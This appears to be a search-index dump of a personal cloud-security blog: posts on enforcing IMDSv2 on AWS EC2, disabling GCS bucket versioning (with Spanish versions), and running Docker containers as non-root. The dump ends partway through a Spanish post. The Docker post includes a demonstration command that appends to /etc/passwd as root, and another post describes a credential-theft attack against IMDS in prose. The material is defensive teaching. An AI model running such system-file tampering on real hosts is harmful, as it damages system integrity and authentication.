<p>Canonical link</p>"},{"location":"blog/old-blogs/2023-08-06_Why-IMDSv1-is-a-Security-Risk-for-Cloud-Infrastructure-350bbe4e8c94/","title":"Why IMDSv1 is a Security Risk for Cloud Infrastructure","text":"<p>Amazon\u2019s Instance Metadata Service (IMDS) provides a way for applications running on Amazon Elastic Compute Cloud (EC2) instances to access\u2026 </p>"},{"location":"blog/old-blogs/2023-08-06_Why-IMDSv1-is-a-Security-Risk-for-Cloud-Infrastructure-350bbe4e8c94/#why-imdsv1-is-a-security-risk-for-cloud-infrastructure_1","title":"Why IMDSv1 is a Security Risk for Cloud Infrastructure","text":"<p>Amazon\u2019s Instance Metadata Service (IMDS) provides a way for applications running on Amazon Elastic Compute Cloud (EC2) instances to access instance metadata and user data. However, the first version of this service, IMDSv1, has been shown to be vulnerable to server-side request forgery (SSRF) attacks. In this blog post, we will explore the security risks associated with using IMDSv1 and why it is important to update to the more secure IMDSv2.</p>"},{"location":"blog/old-blogs/2023-08-06_Why-IMDSv1-is-a-Security-Risk-for-Cloud-Infrastructure-350bbe4e8c94/#what-is-the-difference-between-the-protocol","title":"What is the difference between the protocol?","text":"<p>IMDSv1 and IMDSv2 are two versions of the Instance Metadata Service (IMDS) provided by AWS. IMDS is a service that allows EC2 instances to access metadata and credentials from a local endpoint.</p> <p>The main difference between IMDSv1 and IMDSv2 is that IMDSv2 uses <code>session authentication</code> to protect against open firewalls, reverse proxies, and SSRF vulnerabilities. IMDSv2 requires the software running on the EC2 instance to obtain a <code>secret token</code> using a PUT request before making any GET requests to the IMDS. The token expires after a maximum of six hours and can be used for subsequent requests within the same session.</p> <p>IMDSv1, on the other hand, uses unauthenticated GET requests and is more susceptible to SSRF attacks. IMDSv1 does not require any tokens or session management.</p> <p>AWS recommends adopting IMDSv2 and restricting access to IMDSv2 only for added security. You can use AWS Systems Manager to enforce IMDSv2 on your EC2 instances. You can also use the latest versions of AWS SDKs and CLIs that support IMDSv2.</p> <p>https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/</p>"},{"location":"blog/old-blogs/2023-08-06_Why-IMDSv1-is-a-Security-Risk-for-Cloud-Infrastructure-350bbe4e8c94/#how-to-enforce-imdsv2-on-terraform-yaml-file","title":"How to enforce IMDSv2 on Terraform yaml file","text":"<p>You can enforce the use of IMDSv2 on an EC2 instance launched by Terraform by setting the <code>metadata_options</code> block within the <code>aws_instance</code>resource. Within this block, you can set the <code>http_tokens</code> attribute to <code>required</code>, which will enforce the use of IMDSv2 on the instance.</p> <p>Here\u2019s an example:</p> <pre><code>resource \"aws_instance\" \"example\" {  \n  ami           = \"ami-0c94855ba95c71c99\" # This is an example Amazon Linux 2 AMI ID; replace with the desired AMI ID for your region  \n  instance_type = \"t2.micro\"\n\n  metadata_options {  \n    http_tokens = \"required\"  \n  }  \n}\n</code></pre> <p>This configuration will launch an EC2 instance that requires the use of IMDSv2 to access its metadata.</p>"},{"location":"blog/old-blogs/2023-08-06_Why-IMDSv1-is-a-Security-Risk-for-Cloud-Infrastructure-350bbe4e8c94/#how-to-enforce-imdsv2-with-aws-cli","title":"How to enforce IMDSv2 with AWS CLI","text":"<p>You can use the <code>modify-instance-metadata-options</code> command of the AWS CLI to enforce the use of IMDSv2 on an existing EC2 instance. This command allows you to modify the instance metadata parameters on a running or stopped instance. Here\u2019s an example command that enforces the use of IMDSv2 on a specified instance:</p> <pre><code>aws ec2 modify-instance-metadata-options --instance-id i-0123456789abcdef --http-tokens required --http-endpoint enabled\n</code></pre> <p>In this example, replace <code>i-0123456789abcdef</code> with the ID of the instance you want to modify. The<code>--http-tokens required</code> option enforces the use of IMDSv2 on the instance, while the<code>--http-endpoint enabled</code> option ensures that the instance metadata service remains enabled.</p>"},{"location":"blog/old-blogs/2023-08-06_Why-IMDSv1-is-a-Security-Risk-for-Cloud-Infrastructure-350bbe4e8c94/#what-are-noticeable-thing-that-happened-in-the-past","title":"What are noticeable thing that happened in the past","text":"<p>In June 2021, a threat actor known as UNC2903 exploited a vulnerability in the Adminer database management tool to harvest and abuse credentials using Amazon\u2019s Instance Metadata Service (IMDS). The attacker used a relay box with a 301 redirect script to fool the victim\u2019s server into following the redirect and returning an error that contained AWS API credentials. The attacker then used these credentials to access the victim\u2019s AWS account. This attack highlights the importance of updating to IMDSv2, which would have mitigated this attack.</p>"},{"location":"blog/old-blogs/2023-08-06_Why-IMDSv1-is-a-Security-Risk-for-Cloud-Infrastructure-350bbe4e8c94/#conclusion","title":"Conclusion","text":"<p>In conclusion, IMDSv1 is a security risk for cloud infrastructure due to its vulnerability to server-side request forgery (SSRF) attacks. IMDSv2, on the other hand, uses session authentication and requires a secret token to be obtained before making any requests to the IMDS, providing added security against SSRF attacks. It is important to update to IMDSv2 and enforce its use on EC2 instances, either through Terraform configuration or by using the AWS CLI. Notable incidents, such as the one carried out by UNC2903, highlight the importance of updating to IMDSv2 to mitigate the risk of credential harvesting and abuse.</p>"},{"location":"blog/old-blogs/2023-08-06_Why-IMDSv1-is-a-Security-Risk-for-Cloud-Infrastructure-350bbe4e8c94/#references","title":"References:","text":"<p>Use IMDSv2 \u2014 Amazon Elastic Compute Cloud. https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html</p> <p>How can I use Systems Manager automation to enforce that only IMDSv2 is used to access instance metadata from my Amazon EC2 instance? https://repost.aws/knowledge-center/ssm-ec2-enforce-imdsv2</p> <p>Add defense in depth against open firewalls, reverse proxies, and SSRF vulnerabilities with enhancements to the EC2 Instance Metadata Service https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/</p> <p>Read it on Spanish: Por qu\u00e9 IMDSv1 es un riesgo de seguridad para la infraestructura en nube</p> <p>By Kfir Gisman on August 6, 2023.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2023-08-23_Why-You-Should-Disable-Cloud-Storage-Bucket-Versioning-e6638beffac6/","title":"Why You Should Disable Cloud Storage Bucket Versioning","text":"<p>Cloud Storage is a service that allows you to store and access your data on Google\u2019s infrastructure. It offers high availability\u2026 </p>"},{"location":"blog/old-blogs/2023-08-23_Why-You-Should-Disable-Cloud-Storage-Bucket-Versioning-e6638beffac6/#why-you-should-disable-cloud-storage-bucket-versioning_1","title":"Why You Should Disable Cloud Storage Bucket Versioning","text":"<p>Cloud Storage is a service that allows you to store and access your data on Google\u2019s infrastructure. It offers high availability, durability, scalability, and performance for your data. One of the features that Cloud Storage provides is Bucket Versioning, which lets you keep multiple versions of an object in the same bucket. This can be useful for recovering from accidental deletions or overwrites, as well as preserving historical versions of your data. However, in this blog post, I will explain why you might want to disable Cloud Storage Bucket Versioning, and how to do it.</p>"},{"location":"blog/old-blogs/2023-08-23_Why-You-Should-Disable-Cloud-Storage-Bucket-Versioning-e6638beffac6/#the-drawbacks-of-cloud-storage-bucket-versioning","title":"The Drawbacks of Cloud Storage Bucket Versioning","text":"<p>While Cloud Storage Bucket Versioning can have some benefits, it also comes with some drawbacks that you should be aware of. Here are some of the reasons why you might want to disable Cloud Storage Bucket Versioning:</p> <ul> <li>Cost : Each version of an object is charged at the same rate as when it was live, so keeping multiple versions can increase your storage costs. You can use Object Lifecycle Management to delete older versions automatically, but this may not be sufficient for your needs. For example, if you have a large number of objects that change frequently, you might end up with a lot of versions that you don\u2019t need. Moreover, if you enable Bucket Versioning on a bucket that already contains objects, all the existing objects will be treated as live versions, and you will be charged for them as well.</li> <li>Complexity : Managing multiple versions of an object can add complexity to your application logic and workflows. You need to specify the generation number of the version you want to access, and handle cases where there are no live or noncurrent versions available. For example, if you want to list all the objects in a bucket, you need to use the <code>versions</code> parameter to include both live and noncurrent versions, or use the <code>prefixes</code> parameter to group them by name. If you want to download or delete an object, you need to use the <code>generation</code> parameter to specify which version you want. If you don\u2019t specify a generation number, Cloud Storage will use the latest live version by default.</li> <li>Security : If you have sensitive data that you want to delete permanently, disabling Cloud Storage Bucket Versioning can ensure that no traces of the data remain in the bucket. Otherwise, you need to delete each version individually by specifying the generation number, or use Object Lifecycle Management to delete them after a certain period of time. However, this may not be enough to guarantee that your data is completely erased from Google\u2019s servers. According to Google\u2019s documentation- Google may retain deleted versions for some time after deletion and those deleted versions may still be accessible by authorized users until they are permanently erased. Therefore, if you want to avoid any potential risks of data leakage or breach, disabling Cloud Storage Bucket Versioning might be a better option.</li> </ul>"},{"location":"blog/old-blogs/2023-08-23_Why-You-Should-Disable-Cloud-Storage-Bucket-Versioning-e6638beffac6/#how-to-disable-cloud-storage-bucket-versioning","title":"How to Disable Cloud Storage Bucket Versioning","text":"<p>If you decide that Cloud Storage Bucket Versioning is not suitable for your needs, you can disable it easily using one of the following methods:</p> <p>Google Cloud Console : You can use the Google Cloud Console to manage your buckets and objects. To disable Cloud Storage Bucket Versioning for a bucket, follow these steps:</p> <ol> <li>Go to the [Cloud Storage Browser] page in the Google Cloud Console.</li> <li>Select the bucket that you want to disable Cloud Storage Bucket Versioning for.</li> <li>Click on the Edit bucket button at the top of the page.</li> <li>Under the Versioning section, uncheck the box next to Enable versioning.</li> <li>Click on Save to apply the changes.</li> </ol> <p>gsutil : You can use the gsutil command-line tool to perform various operations on your buckets and objects. To disable Cloud Storage Bucket Versioning for a bucket, use this command:</p> <pre><code>gsutil versioning set off gs://&lt;bucket_name&gt;\n</code></pre> <p>Replace <code>&lt;bucket_name&gt;</code> with the name of your bucket.</p> <p>Cloud Storage API : You can use the Cloud Storage API to programmatically interact with your buckets and objects. To disable Cloud Storage Bucket Versioning for a bucket, send a PATCH request to this endpoint:</p> <pre><code>PATCH https://storage.googleapis.com/storage/v1/b/&lt;bucket_name&gt;\n</code></pre> <p>Replace <code>bucket_name</code> with the name of your bucket. In the request body, set the <code>versioning.enabled</code> property to <code>false</code>. For example:</p> <pre><code>{  \n  \"versioning\": {  \n    \"enabled\": false  \n  }  \n}\n</code></pre> <p>Terraform :</p> <pre><code>resource \"google_storage_bucket\" \"bucket_name\" {  \n  ...  \n  versioning {  \n    enabled = false  \n  }  \n}\n</code></pre>"},{"location":"blog/old-blogs/2023-08-23_Why-You-Should-Disable-Cloud-Storage-Bucket-Versioning-e6638beffac6/#conclusion","title":"Conclusion","text":"<p>Cloud Storage Bucket Versioning is a feature that can help you preserve and restore multiple versions of your objects in the same bucket. However, it also has some drawbacks that might outweigh its benefits, such as cost, complexity, and security. Therefore, you might want to disable Cloud Storage Bucket Versioning for your buckets, depending on your use case and requirements. You can use the Google Cloud Console, the gsutil command-line tool, or the Cloud Storage API to disable Cloud Storage Bucket Versioning easily and quickly.</p>"},{"location":"blog/old-blogs/2023-08-23_Why-You-Should-Disable-Cloud-Storage-Bucket-Versioning-e6638beffac6/#references","title":"References","text":"<ol> <li>https://cloud.google.com/storage/docs/using-versioned-objects</li> <li>https://cloud.google.com/storage/docs/object-versioning#permanently_delete</li> <li>https://cloud.google.com/storage/docs/samples/storage-disable-versioning</li> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#enabled</li> </ol> <p>By Kfir Gisman on August 23, 2023.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2023-08-24_Por-Qu--Deber-as-Desactivar-el-Control-de-Versiones-de-Los-Dep-sitos-de-Almacenamiento-en-La-Nube-c8051bdb3738/","title":"Por Qu\u00e9 Deber\u00edas Desactivar el Control de Versiones de Los Dep\u00f3sitos de Almacenamiento en La Nube","text":"<p>This blog is available in English here: https://medium.com/@kfir_g/why-you-should-disable-cloud-storage-bucket-versioning-e6638beffac6 </p>"},{"location":"blog/old-blogs/2023-08-24_Por-Qu--Deber-as-Desactivar-el-Control-de-Versiones-de-Los-Dep-sitos-de-Almacenamiento-en-La-Nube-c8051bdb3738/#por-que-deberias-desactivar-el-control-de-versiones-de-los-depositos-de-almacenamiento-en-la-nube_1","title":"Por Qu\u00e9 Deber\u00edas Desactivar el Control de Versiones de Los Dep\u00f3sitos de Almacenamiento en La Nube","text":"<p>This blog is available in English here: https://medium.com/@kfir_g/why-you-should-disable-cloud-storage-bucket-versioning-e6638beffac6</p> <p>El almacenamiento en la nube es un servicio que te permite almacenar y acceder a tus datos en la infraestructura de Google. Ofrece alta disponibilidad, durabilidad, escalabilidad y rendimiento para tus datos. Una de las caracter\u00edsticas que ofrece el almacenamiento en la nube es el control de versiones de los dep\u00f3sitos, que te permite mantener varias versiones de un objeto en el mismo dep\u00f3sito. Esto puede ser \u00fatil para recuperarse de eliminaciones o sobreescrituras accidentales, as\u00ed como para preservar versiones hist\u00f3ricas de tus datos. Sin embargo, en esta blog, explicar\u00e9 por qu\u00e9 podr\u00edas querer desactivar el control de versiones de los dep\u00f3sitos de almacenamiento en la nube y c\u00f3mo hacerlo.</p>"},{"location":"blog/old-blogs/2023-08-24_Por-Qu--Deber-as-Desactivar-el-Control-de-Versiones-de-Los-Dep-sitos-de-Almacenamiento-en-La-Nube-c8051bdb3738/#las-desventajas-del-control-de-versiones-de-los-depositos-de-almacenamiento-en-la-nube","title":"Las Desventajas del Control de Versiones de Los Dep\u00f3sitos de Almacenamiento en La Nube","text":"<p>Si bien el control de versiones de los dep\u00f3sitos de almacenamiento en la nube puede tener algunos beneficios, tambi\u00e9n tiene algunas desventajas que debes tener en cuenta. Estas son algunas de las razones por las que podr\u00edas querer desactivar el control de versiones de los dep\u00f3sitos de almacenamiento en la nube:</p> <ul> <li>Costo : Cada versi\u00f3n de un objeto se cobra a la misma tarifa que cuando estaba activo, por lo que mantener varias versiones puede aumentar sus costos de almacenamiento. Puedes usar la administraci\u00f3n del ciclo de vida de los objetos para eliminar autom\u00e1ticamente las versiones anteriores, pero esto puede no ser suficiente para tus necesidades. Por ejemplo, si tienes una gran cantidad de objetos que cambian con frecuencia, podr\u00edas terminar con muchas versiones que no necesitas. Adem\u00e1s, si habilitas el control de versiones en un dep\u00f3sito que ya contiene objetos, todos los objetos existentes se tratar\u00e1n como versiones activas y se te cobrar\u00e1 por ellas tambi\u00e9n.</li> <li>Complejidad : Gestionar varias versiones de un objeto puede a\u00f1adir complejidad a la l\u00f3gica y los flujos de trabajo de tu aplicaci\u00f3n. Necesitas especificar el n\u00famero de generaci\u00f3n de la versi\u00f3n a la que quieres acceder, y manejar los casos en los que no hay versiones activas o no actuales disponibles. Por ejemplo, si quieres listar todos los objetos de un dep\u00f3sito, necesitas usar el par\u00e1metro <code>versions</code>para incluir tanto las versiones activas como las no actuales, o usar el par\u00e1metro <code>prefixes</code>para agruparlas por nombre. Si quieres descargar o eliminar un objeto, necesitas usar el par\u00e1metro generaci\u00f3n para especificar qu\u00e9 versi\u00f3n quieres. Si no especificas un n\u00famero de <code>generation</code>, Cloud Storage usar\u00e1 por defecto la \u00faltima versi\u00f3n activa.</li> <li>Seguridad : Si tienes datos sensibles que quieres eliminar permanentemente, desactivar el versionado de dep\u00f3sitos de Cloud Storage puede asegurar que no queden rastros de los datos en el dep\u00f3sito. De lo contrario, necesitas eliminar cada versi\u00f3n individualmente especificando el n\u00famero de generaci\u00f3n, o usar la gesti\u00f3n del ciclo de vida de los objetos para eliminarlos despu\u00e9s de un cierto per\u00edodo de tiempo. Sin embargo, esto puede no ser suficiente para garantizar que tus datos se borren completamente de los servidores de Google. Seg\u00fan la documentaci\u00f3n de Google- Google puede retener las versiones eliminadas durante alg\u00fan tiempo despu\u00e9s de la eliminaci\u00f3n y esas versiones eliminadas pueden seguir siendo accesibles por los usuarios autorizados hasta que se borren permanentemente. Por lo tanto, si quieres evitar cualquier riesgo potencial de fuga o violaci\u00f3n de datos, desactivar el versionado de dep\u00f3sitos de Cloud Storage podr\u00eda ser una mejor opci\u00f3n.</li> </ul>"},{"location":"blog/old-blogs/2023-08-24_Por-Qu--Deber-as-Desactivar-el-Control-de-Versiones-de-Los-Dep-sitos-de-Almacenamiento-en-La-Nube-c8051bdb3738/#como-desactivar-el-versionado-de-depositos-de-cloud-storage","title":"C\u00f3mo Desactivar el Versionado de Dep\u00f3sitos de Cloud Storage","text":"<p>Si decides que el versionado de dep\u00f3sitos de Cloud Storage no es adecuado para tus necesidades, puedes desactivarlo f\u00e1cilmente usando uno de los siguientes m\u00e9todos:</p> <p>Consola de Google Cloud: Puedes usar la consola de Google Cloud para gestionar tus dep\u00f3sitos y objetos. Para desactivar el versionado de dep\u00f3sitos de Cloud Storage para un dep\u00f3sito, sigue estos pasos:</p> <ol> <li>Ve a la p\u00e1gina [Navegador de Cloud Storage] en la consola de Google Cloud.</li> <li>Selecciona el dep\u00f3sito para el que quieres desactivar el versionado de dep\u00f3sitos de Cloud Storage.</li> <li>Haz clic en el bot\u00f3n Editar dep\u00f3sito en la parte superior de la p\u00e1gina.</li> <li>En la secci\u00f3n Versionado , desmarca la casilla junto a Habilitar versionado.</li> <li>Haz clic en Guardar para aplicar los cambios.</li> </ol> <p>gsutil : Puedes usar la herramienta de l\u00ednea de comandos gsutil para realizar diversas operaciones en tus dep\u00f3sitos y objetos. Para desactivar el versionado de dep\u00f3sitos de Cloud Storage para un dep\u00f3sito, usa este comando:</p> <pre><code>gsutil versioning set off gs://&lt;bucket_name&gt;\n</code></pre> <p>Reemplaza <code>&lt;bucket_name&gt;</code>con el nombre de tu dep\u00f3sito.</p> <p>API de Cloud Storage: Puedes usar la API de Cloud Storage para interactuar program\u00e1ticamente con tus dep\u00f3sitos y objetos. Para desactivar el versionado de dep\u00f3sitos de Cloud Storage para un dep\u00f3sito, env\u00eda una solicitud PATCH a este punto final:</p> <pre><code>PATCH https://storage.googleapis.com/storage/v1/b/&lt;bucket_name&gt;\n</code></pre> <p>Reemplaza <code>bucket_name</code>con el nombre de tu dep\u00f3sito. En el cuerpo de la solicitud, establece la propiedad <code>versioning.enabled</code>en <code>false</code>. Por ejemplo:</p> <pre><code>{  \n  \"versioning\": {  \n    \"enabled\": false  \n  }  \n}\n</code></pre> <p>Terraform :</p> <pre><code>resource \"google_storage_bucket\" \"bucket_name\" {  \n  ...  \n  versioning {  \n    enabled = false  \n  }  \n}\n</code></pre>"},{"location":"blog/old-blogs/2023-08-24_Por-Qu--Deber-as-Desactivar-el-Control-de-Versiones-de-Los-Dep-sitos-de-Almacenamiento-en-La-Nube-c8051bdb3738/#conclusion","title":"Conclusi\u00f3n","text":"<p>El versionado de dep\u00f3sitos de Cloud Storage es una caracter\u00edstica que puede ayudarte a preservar y restaurar m\u00faltiples versiones de tus objetos en el mismo dep\u00f3sito. Sin embargo, tambi\u00e9n tiene algunos inconvenientes que podr\u00edan superar sus beneficios, como el coste, la complejidad y la seguridad. Por lo tanto, es posible que quieras desactivar el versionado de dep\u00f3sitos de Cloud Storage para tus dep\u00f3sitos, dependiendo de tu caso de uso y requisitos. Puedes usar la consola de Google Cloud, la herramienta de l\u00ednea de comandos gsutil o la API de Cloud Storage para desactivar el versionado de dep\u00f3sitos de Cloud Storage f\u00e1cil y r\u00e1pidamente.</p>"},{"location":"blog/old-blogs/2023-08-24_Por-Qu--Deber-as-Desactivar-el-Control-de-Versiones-de-Los-Dep-sitos-de-Almacenamiento-en-La-Nube-c8051bdb3738/#referencias","title":"Referencias","text":"<ol> <li>https://cloud.google.com/storage/docs/using-versioned-objects</li> <li>https://cloud.google.com/storage/docs/object-versioning#permanently_delete</li> <li>https://cloud.google.com/storage/docs/samples/storage-disable-versioning</li> <li>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#enabled</li> </ol> <p>By Kfir Gisman on August 24, 2023.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2023-12-29_Securing-Docker--Non-Root-User-Best-Practices-5784ac25e755/","title":"Securing Docker: Non-Root User Best Practices","text":"<p>Docker is a containerization platform that simplifies the deployment and scaling of applications by packaging them into lightweight\u2026 </p>"},{"location":"blog/old-blogs/2023-12-29_Securing-Docker--Non-Root-User-Best-Practices-5784ac25e755/#securing-docker-non-root-user-best-practices_1","title":"Securing Docker: Non-Root User Best Practices","text":"<p>Docker is a containerization platform that simplifies the deployment and scaling of applications by packaging them into lightweight, portable units called containers. A Docker image is a standalone, executable package that includes everything needed to run a software application, including the code, runtime, libraries, and system tools. Images serve as the foundation for creating containers, enabling consistent and efficient application deployment across various environments.</p> <p>Docker gained popularity among developers for revolutionising application deployment through containerization. Its lightweight, portable containers provided a consistent environment, simplifying the development and deployment process. Docker\u2019s ease of use, compatibility across different platforms, and efficient resource utilisation contributed to its rapid adoption, empowering developers to build, ship, and run applications seamlessly across diverse environments.</p> <p>Docker, like any software, is not immune to vulnerabilities. As containerization technology evolves, security concerns arise. Users must remain vigilant, regularly updating and monitoring Docker images to address potential vulnerabilities and ensure a secure deployment environment.</p> <p>Granting a non-root user access within a Docker container serves as a simple yet impactful example to illustrate vulnerabilities in Docker, emphasising the importance of maintaining security best practices.</p> <p>Running Docker containers with root user privileges can pose security risks for several reasons:</p> <ol> <li>Privilege Escalation: Running containers as the root user may provide a path for privilege escalation. If an attacker can exploit a vulnerability within the container, they might be able to escalate their privileges and gain control of the underlying host system.</li> <li>Increased Attack Surface: Allowing a Docker container to run as the root user increases the potential attack surface. If an attacker gains control of a container with root privileges, they may have more options to exploit vulnerabilities and compromise the host system.</li> <li>File System Access: Root access within a container means unrestricted access to the file system. This could lead to unintended modifications or deletions of critical system files, potentially causing system instability or data loss.</li> <li>User Namespace Isolation: Docker containers leverage user namespaces to provide some level of isolation between the container and host system users. Running containers as a non-root user ensures that even if an attacker gains access to the container, they won\u2019t automatically have root access on the host.</li> <li>Security Best Practices: Following security best practices is essential to minimise potential vulnerabilities. Running containers with the least privilege necessary is a fundamental principle in container security. By using a non-root user, you adhere to the principle of least privilege, limiting the potential impact of security breaches.</li> </ol> <p>Utilising a non-root user in Docker implementing the least privilege principle outlined in OWASP Access Control guidelines. This practice is discouraged, as highlighted in both the OWASP Docker Security Sheets, specifically in rule #2 \u201cset a user,\u201d and the CIS Docker Benchmark V1.6.0 under \u201c4.1 \u2014 Ensure that a user for the container has been created (Manual).\u201d Following these guidelines improves container security by limiting unnecessary permissions and lessening the chance of security issues.</p> <p>With a non-root user in a Dockerfile, you\u2019d include the \u201cUSER\u201d instruction, such as \u201cUSER myuser,\u201d to switch to a less privileged identity. Without it, the default is running as root. In a \u201cdocker run\u201d command, specifying a user involves the \u201c-u\u201d flag, like \u201cdocker run -u 1000\u201d where 1000 is the user ID. These code snippets illustrate how to set and manage user permissions within a Docker image, promoting security by minimising the use of elevated privileges.</p> <p>Negative Test:</p> <pre><code># Example Negative\n\n# Uses Ubuntu as a parent image  \nFROM ubuntu:22.04\n\n# Create a non-root user and switch to it  \nRUN useradd -m myuser  \nUSER myuser\n\n# When the container launches, bash shell also launches  \nCMD [\"/bin/bash\"]`\n</code></pre> <p>Positive Test:</p> <pre><code>#Example Positive\n\n# Uses Ubuntu as a parent image  \nFROM ubuntu:22.04\n\n# When the container launches, bash shell also launches  \nCMD [\"/bin/bash\"]\n</code></pre>"},{"location":"blog/old-blogs/2023-12-29_Securing-Docker--Non-Root-User-Best-Practices-5784ac25e755/#demonstration-of-acquiring-non-root-access-in-a-dockerfile","title":"Demonstration of acquiring non-root access in a Dockerfile","text":"<p>This Demo violation of Privilege Escalation, File System Access and Security Best Practice.</p>"},{"location":"blog/old-blogs/2023-12-29_Securing-Docker--Non-Root-User-Best-Practices-5784ac25e755/#what-is-passwd-file","title":"What Is passwd File","text":"<p>The <code>/etc/passwd</code> file inside a Docker container is a standard system file that stores user account information. It is commonly used on Unix-like operating systems, including Linux. Each line in the file represents a user account and contains various pieces of information about that user.</p> <p>The typical format of a line in the <code>/etc/passwd</code> file is as follows:</p> <p><code>username:password:userID:groupID:userInfo:homeDirectory:loginShell</code></p> <p>Here\u2019s a breakdown of the fields:</p> <p><code>**username:** The name of the user.   **password:** Usually represented by \u2018x,\u2019 indicating that the actual encrypted password is stored in the /etc/shadow file or another secure location.   **userID (UID):** A unique numerical identifier for the user.   **groupID (GID):** The numerical identifier of the user\u2019s primary group.   userInfo: Additional information about the user (often the full name).   **homeDirectory:** The user\u2019s home directory, where they typically start when they log in.   **loginShell:** The user\u2019s default shell.</code></p>"},{"location":"blog/old-blogs/2023-12-29_Securing-Docker--Non-Root-User-Best-Practices-5784ac25e755/#why-is-it-demonstrate-insecure-exploit","title":"Why Is It Demonstrate Insecure Exploit","text":"<p>In a typical Unix-like system, including Linux, the <code>/etc/passwd</code> file is used to store user account information, and traditionally it has read permissions for all users. The permissions might look something like:</p> <p><code>-rw-r \u2014 r \u2014 1 root root 1153 Dec 8 12:34 /etc/passwd</code></p> <p>Here, the file is readable by everyone, but only writable by the root user. If a non-root user has the ability to write to the<code>/etc/passwd</code> file, it can potentially lead to security vulnerabilities and risks. Here are a few reasons why:</p> <ol> <li>User Privilege Escalation: If a non-root user can write to the <code>/etc/passwd</code> file, they may be able to manipulate the entries within it. This could include modifying the UID (user ID) or GID (group ID) of existing users, potentially allowing the non-root user to escalate their privileges.</li> <li>User Identity Spoofing: By modifying the <code>/etc/passwd</code> file, a non-root user might be able to impersonate other users or gain unauthorised access to resources associated with those users. This could lead to security breaches and unauthorised access.</li> <li>System Integrity: The <code>/etc/passwd</code> file is crucial for the proper functioning of the system. If its contents are tampered with, it could result in system instability, errors, or disruptions in user authentication.</li> <li>Container Escape: If this manipulation occurs within a containerized environment, it might be used as part of a larger attack to escape the container and gain unauthorised access to the host system.</li> </ol>"},{"location":"blog/old-blogs/2023-12-29_Securing-Docker--Non-Root-User-Best-Practices-5784ac25e755/#demo","title":"Demo","text":"<p>I executed the docker build command on the preceding positive and negative Dockerfile tests (that appears above), followed by the docker run command. In the positive test, where the Dockerfile lacked a \u201cUSER\u201d field, I utilised a <code>echo \u201ctest\u201d &gt;&gt; /etc/passwd</code> command to illustrate gaining command access. Conversely, in the negative test with the \u201cUSER\u201d field, I demonstrated the prevention of gaining root user control.</p> <p>Negative TestPositive Test</p>"},{"location":"blog/old-blogs/2023-12-29_Securing-Docker--Non-Root-User-Best-Practices-5784ac25e755/#conclusion","title":"Conclusion","text":"<p>In conclusion, Docker has completely transformed the landscape of application deployment through its innovative containerization platform. It provides developers with agile and portable containers, streamlining development workflows. The widespread adoption of Docker can be attributed to its user-friendly interface, compatibility across various platforms, and efficient resource utilization. However, as containerization technology evolves, it introduces security challenges, particularly in vulnerability management.</p> <p>To tackle these issues, it\u2019s crucial to follow best practices and guidelines from OWASP and the CIS Docker Benchmark. Avoiding giving root user privileges in Docker containers is an important security step, as shown by messing with the <code>/etc/passwd</code> file, which exposes potential risks in managing user account information.Securing Docker environments depends on managing users properly, highlighting the importance of using non-root users in Dockerfiles and runtime configurations.</p> <p>As developers, incorporating these practices is paramount for mitigating security risks and ensuring the establishment of a robust and secure deployment environment.</p>"},{"location":"blog/old-blogs/2023-12-29_Securing-Docker--Non-Root-User-Best-Practices-5784ac25e755/#references","title":"References","text":"<p>https://www.docker.com/blog/docker-index-dramatic-growth-in-docker-usage-affirms-the-continued-rising-power-of-developers/</p> <p>https://www.docker.com/blog/container-security-and-why-it-matters/</p> <p>https://linuxize.com/post/etc-passwd-file/</p> <p>https://owasp.org/www-community/Access_Control</p> <p>https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-2-set-a-user</p> <p>https://www.cisecurity.org/insights/blog/announcing-cis-benchmark-for-docker-1-6</p> <p>https://docs.docker.com/engine/reference/builder/#user</p> <p>By Kfir Gisman on December 29, 2023.</p> <p>Canonical link</p>"},{"location":"blog/old-blogs/2024-01-04_Asegurando-Docker--Mejores-Pr-cticas-para-Usuarios-Non-Root-aafb40f7766b/","title":"Asegurando Docker: Mejores Pr\u00e1cticas para Usuarios Non-Root","text":"<p>Docker es una plataforma de contenerizaci\u00f3n que simplifica la implementaci\u00f3n y escalabilidad de aplicaciones al empaquetarlas en unidades\u2026 </p>"},{"location":"blog/old-blogs/2024-01-04_Asegurando-Docker--Mejores-Pr-cticas-para-Usuarios-Non-Root-aafb40f7766b/#asegurando-docker-mejores-practicas-para-usuarios-non-root_1","title":"Asegurando Docker: Mejores Pr\u00e1cticas para Usuarios Non-Root","text":"<p>Docker es una plataforma de contenerizaci\u00f3n que simplifica la implementaci\u00f3n y escalabilidad de aplicaciones al empaquetarlas en unidades ligeras y port\u00e1tiles llamadas contenedores. Una imagen de Docker es un paquete ejecutable independiente que incluye todo lo necesario para ejecutar una aplicaci\u00f3n de software, como el c\u00f3digo, el tiempo de ejecuci\u00f3n, las bibliotecas y las herramientas del sistema. Las im\u00e1genes sirven como base para la creaci\u00f3n de contenedores, permitiendo una implementaci\u00f3n consistente y eficiente de aplicaciones en diversos entornos.</p> <p>Docker gan\u00f3 popularidad entre los desarrolladores al revolucionar la implementaci\u00f3n de aplicaciones mediante la contenerizaci\u00f3n. Sus contenedores ligeros y port\u00e1tiles ofrecieron un entorno consistente, simplificando el proceso de desarrollo e implementaci\u00f3n. La facilidad de uso de Docker, su compatibilidad en diferentes plataformas y la eficiente utilizaci\u00f3n de recursos contribuyeron a su r\u00e1pida adopci\u00f3n, capacitando a los desarrolladores para construir, enviar y ejecutar aplicaciones de manera fluida en entornos diversos.</p> <p>Docker, al igual que cualquier software, no est\u00e1 exento de vulnerabilidades. A medida que la tecnolog\u00eda de contenerizaci\u00f3n evoluciona, surgen preocupaciones de seguridad. Los usuarios deben permanecer atentos, actualizando y monitoreando regularmente las im\u00e1genes de Docker para abordar posibles vulnerabilidades y garantizar un entorno de implementaci\u00f3n seguro.</p> <p>Conceder acceso a un usuario** __non-root __** dentro de un contenedor de Docker sirve como un ejemplo simple pero impactante para ilustrar vulnerabilidades en Docker, enfatizando la importancia de mantener las mejores pr\u00e1cticas de 